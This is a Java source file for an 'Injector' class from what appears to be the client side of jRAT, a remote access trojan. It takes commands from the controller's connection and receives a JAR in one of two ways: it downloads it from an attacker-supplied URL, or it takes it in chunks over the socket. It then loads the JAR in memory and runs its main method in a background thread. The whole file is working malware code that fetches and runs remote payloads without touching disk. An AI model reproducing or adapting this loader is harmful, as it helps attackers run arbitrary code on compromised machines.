package jrat.client;

import jrat.common.MemoryClassLoader;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.DataInputStream;
import java.io.InputStream;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLConnection;
import java.util.jar.JarInputStream;

public class Injector {

	private Connection con;
	
	public Injector(Connection con) {
		this.con = con;
	}

	public void inject(DataInputStream dis) throws Exception {
		String mainClass = con.readLine();
		boolean fromUrl = con.readBoolean();
		
		long size;
		
		ByteArrayOutputStream baos;
		
		if (fromUrl) {
			String url = con.readLine();
			URLConnection con = new URL(url).openConnection();
			InputStream in = con.getInputStream();
			
			baos = new ByteArrayOutputStream(con.getContentLength());
			
			byte[] buffer = new byte[1024];
			
			int count;
			while ((count = in.read(buffer, 0, 1024)) != -1) {
				baos.write(buffer, 0, count);
			}

			in.close();
		} else {
			int chunkSize;

			size = dis.readLong();
			
			baos = new ByteArrayOutputStream((int) size);

			while ((chunkSize = dis.readInt()) != -1) {
				byte[] chunk = new byte[chunkSize];

				dis.readFully(chunk);

				baos.write(chunk);
			}
		}
		
		
		ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
		
		MemoryClassLoader classLoader = new MemoryClassLoader(Injector.class.getClassLoader(), new JarInputStream(bais));
	
		final Class<?> classToLoad = classLoader.loadClass(mainClass);
		final Method method = classToLoad.getMethod("main", String[].class);
		
		new Thread(new Runnable() {
			@Override
			public void run() {
				try {
					method.invoke(classToLoad.newInstance(), new Object[] { new String[0] });
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
		}).start();
	}
}
